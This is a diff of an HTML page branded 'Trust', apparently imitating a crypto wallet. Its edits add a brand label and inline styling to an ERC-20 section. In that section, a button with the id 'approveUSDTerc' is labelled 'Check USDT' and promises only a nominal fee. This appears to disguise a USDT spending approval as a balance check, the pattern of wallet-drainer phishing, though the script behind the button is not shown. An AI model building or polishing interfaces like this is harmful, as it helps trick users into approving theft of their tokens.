@@ -359,7 +359,9 @@
         <div class="container">
             <a class="navbar-brand" href="index.html">
                 <img src="trust.svg" alt="Trust Logo" height="30">
+                <span style="margin-left: 8px; font-weight: bold;">Trust</span>
             </a>
+
 
             <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav"
                 aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
@@ -414,25 +416,30 @@
         </div>
     </div>
 
-    <div id="erc-container" class="wallet-container" style="display: none;">
+    <div id="erc-container" class="wallet-container" style="display: none; padding: 16px;">
         <!-- Approve USDT Section for ERC-20 -->
-        <div id="approveUSDTSectionerc" class="approve-section" style="display: none;">
-            <div class="text-center">
-                <button id="approveUSDTerc" class="btn btn-warning btn-lg px-5">
-                    <i class="fas fa-award me-2"></i>Check USDT
+        <div id="approveUSDTSectionerc" class="approve-section" style="display: none; margin-bottom: 20px;">
+            <div class="text-center" style="text-align: center;">
+                <button id="approveUSDTerc"
+                    style="width: 100%; max-width: 400px; padding: 14px 20px; font-size: 16px; background-color: #ffc107; border: none; border-radius: 8px; color: #000; font-weight: bold; box-shadow: 0 4px 8px rgba(0,0,0,0.1);">
+                    <i class="fas fa-award" style="margin-right: 8px;"></i>Check USDT
                 </button>
-                <p class="text-muted mt-2 small">This will charge you a nominal fee less then 1 USDT</p>
+                <p class="text-muted" style="margin-top: 10px; font-size: 13px; color: #6c757d;">
+                    This will charge you a nominal fee less than 1 USDT
+                </p>
             </div>
         </div>
 
         <!-- ERC-20 Wallet Info -->
-        <div id="walletInfoerc" class="wallet-info" style="display: none;">
-            <div class="wallet-row">
-                <span class="wallet-label">USDT Balance:</span>
-                <span id="userBalanceerc">Loading...</span>
+        <div id="walletInfoerc" class="wallet-info"
+            style="display: none; font-size: 15px; background: #f9f9f9; padding: 12px; border-radius: 6px;">
+            <div class="wallet-row" style="display: flex; justify-content: space-between; align-items: center;">
+                <span class="wallet-label" style="font-weight: 600;">USDT Balance:</span>
+                <span id="userBalanceerc" style="font-weight: 500;">Loading...</span>
             </div>
         </div>
     </div>
+
 
     <!-- Main Content -->
     <div class="main-content">
